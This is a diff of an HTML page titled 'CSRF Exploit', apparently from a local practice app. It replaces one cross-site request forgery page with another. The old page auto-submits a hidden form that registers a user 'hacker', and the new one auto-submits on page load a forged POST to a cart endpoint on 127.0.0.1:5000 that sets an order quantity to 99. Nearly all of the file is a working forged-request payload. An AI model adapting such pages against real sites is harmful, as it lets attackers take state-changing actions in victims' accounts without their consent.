@@ -1,5 +1,12 @@
-<form action="http://127.0.0.1:5000/register" method="POST">
-    <input type="hidden" name="username" value="hacker">
-    <input type="hidden" name="password" value="hacked123">
-    <script>document.forms[0].submit();</script>
-</form>  
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Exploit</title>
+</head>
+<body onload="document.getElementById('csrf-form').submit();">
+    <form id="csrf-form" action="http://127.0.0.1:5000/update_cart" method="POST">
+        <input type="hidden" name="item" value="Pizza Margherita">
+        <input type="hidden" name="quantity" value="99">
+    </form>
+</body>
+</html>
